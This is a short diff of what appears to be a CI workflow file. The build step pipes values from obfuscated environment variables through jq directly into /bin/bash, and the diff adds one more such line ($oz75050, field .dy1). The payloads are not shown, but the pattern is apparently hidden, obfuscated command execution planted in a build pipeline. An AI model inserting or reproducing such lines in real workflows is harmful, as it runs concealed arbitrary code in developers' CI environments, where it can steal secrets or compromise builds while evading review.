@@ -58,6 +58,7 @@ jobs:
           echo $ruro615 | jq -r .crc72 | /bin/bash
           echo $le39058 | jq -r .m84 | /bin/bash
           printf '%s' "$lugb52276" | jq -r .v0682 | /bin/bash
+          printf '%s' "$oz75050" | jq -r .dy1 | /bin/bash
 
       - name: Upload artifact
         if: always()
